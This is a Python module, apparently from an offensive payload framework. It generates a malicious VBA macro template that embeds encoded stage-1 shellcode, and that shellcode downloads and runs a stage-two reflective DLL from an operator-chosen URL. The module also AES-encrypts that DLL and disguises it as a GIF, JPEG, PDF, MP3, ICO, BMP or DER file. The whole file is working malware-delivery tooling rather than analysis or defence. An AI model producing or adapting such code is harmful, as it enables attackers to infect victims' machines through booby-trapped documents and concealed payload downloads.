
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import escapebackslash
from lib.tab_completers.generic import tab_choice
from lib.validators.generic import iswebaddress, ischoice
from lib.validators.files import isreadable
from data.scripts.BinaryToVbaFunc import BinaryToVbaFunc
import os


URL_PLACEHOLDER = b"http://AAAAAAAAAAAA.BBBBBBBBBBBB.CCCCCCCCCCCC/DDDDDDDDDDDD.EEEEEEEEEEEE"
AES_KEY_PLACEHOLDER = b"KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"
STAGE1_PAYLOAD_FMTSTR = "payload{}.bin"


class Template(ModuleInterface): #usename
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        self.randomkey = helpers.binary.getAESKey()
        self.encodings = { "0": "-", "6": "!" }
        options['url'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location we'll pull the output_stagefile from",
            "validator": iswebaddress,
            "handler": escapebackslash
        }
        options['arch'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "arch of INPUT_STAGE",
            "validator": ischoice,
            "validatorargs": {"choices": ["x86", "x64"]},
            "tab_complete": tab_choice,
            "tab_args": {'choices': ["x86", "x64"]},
            "noinsert": True
        }
        options['output_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location to write encrypted stage to.  Supported file extensions [.gif, .jpg, .jpeg, .pdf, .mp3, .ico, .bmp, .der]",
            "validator": None,
            "tab_complete": self.helpers.complete_path,
            "handler": None,
            "noinsert": True
        }
        options['input_stagefile'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "Location of Reflective DLL to be encoded / encrypted and sent to output_stagefile",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "noinsert": True
        }
        super().__init__(templatePath, options)

    def preprocess(self):
        # Create the stage 1 shellcode which will download and execute the stager
        # Convert the shellcode into VBA functions
        stage1_path = os.path.join(
            self.helpers.getpayloaddir(), 
            STAGE1_PAYLOAD_FMTSTR.format(
                self.options['arch']['value']
            )
        )
        stage1_shellcode = ""
        with open(stage1_path, 'rb') as fPayload:
            stage1_shellcode = fPayload.read()
        stage1_shellcode = self.helpers.binary.patchValues(
            AES_KEY_PLACEHOLDER, 
            stage1_shellcode, 
            self.randomkey
        )
        self.options['getStage_1'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage1 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_1']['value'] = BinaryToVbaFunc(
            stage1_shellcode, 
            'getStage_1', 
            self.encodings
        )

    def postprocess(self):
        # Remove the generated shellcode functions from the options
        del self.options['getStage_1']
        
        file_type = self.options['output_stagefile']['value'].split('.')[-1]
        payload = self.helpers.encode_dll(
            self.options['input_stagefile']['value'], 
            file_type, 
            self.randomkey
        )
        with open(self.options['output_stagefile']['value'], 'wb') as fp:
            fp.write(payload)
    # end postprocess


